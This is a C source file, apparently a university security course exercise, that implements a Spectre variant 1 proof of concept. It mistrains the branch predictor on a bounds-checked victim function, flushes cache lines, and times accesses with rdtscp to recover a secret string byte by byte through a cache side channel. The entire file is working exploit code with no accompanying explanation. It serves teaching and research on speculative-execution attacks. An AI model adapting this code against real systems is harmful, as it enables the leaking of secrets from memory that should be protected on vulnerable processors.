#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

unsigned int spy_size = 16;
uint8_t spy[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t cache_set[256 * 512];
char *secret = "Cybersecurity Fundamental Tsinghua University";
uint8_t temp = 0;

void victim_function(size_t x)
{
    if (x < spy_size)
    {
        temp &= cache_set[spy[x] * 512];
    }
}

#define threshold (80)

void attack(size_t malicious_x) {
    int ti, i, j, k, random_i;
    static int result[256];
    unsigned int junk = 0;
    size_t x, real_x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for(i = 0; i < 256; i++)
        result[i] = 0;
    for (ti = 999; ti > 0; ti--) {
        for (i = 0; i < 256; i++) {
            _mm_clflush(&cache_set[i * 512]);
        }
        real_x = ti % spy_size;
        for (j = 29; j > 0; j--) {
            _mm_clflush(&spy_size);
            for (volatile int z = 0; z < 100; z++) {
            }
            // Cannot use if/else to get off branch predictor
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = real_x ^ (x & (malicious_x ^ real_x));
            victim_function(x);
        }
        for (i = 0; i < 256; i++) {
            random_i = ((i * 167) + 13) & 255;
            addr = &cache_set[random_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 < threshold && random_i != spy[ti % spy_size]) {   
                result[random_i]++;
            }
        }
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || result[i] >= result[j]) {
                k = j;
                j = i;
            } else if (k < 0 ||result[i] >= result[k]) {
                k = i;
            }
        }
    }
    // result[0] ^= junk;
    // int optimize = 1132;
    // max_char[0] = (uint8_t)j;
    // score[0] = result[j];
    // max_char[1] = (uint8_t)k;
    // score[1] = result[k];
    printf("%c   %d   %c   %d\n", (uint8_t)j, result[j], (uint8_t)k, result[k]);
}

typedef struct MainVar {
    size_t malicious_x;
    size_t i;
    int64_t len;
    int64_t pad[5];
} __attribute__((aligned(4096))) MainVar;

int main() {
    MainVar x;
    printf("Secret: %p\n", (void *)(secret));
    x.malicious_x = (size_t)(secret - (char *)spy);
    x.len = strlen(secret);
    printf("%p\n", &x);
    for (x.i = 0; x.i < sizeof(cache_set); x.i++) {
        cache_set[x.i] = 1;
    }
    while (--x.len >= 0) {
        attack(x.malicious_x);
        // printf("%02X   %c   %d\n", max_char, max_char, score);
        x.malicious_x++;
    }
}
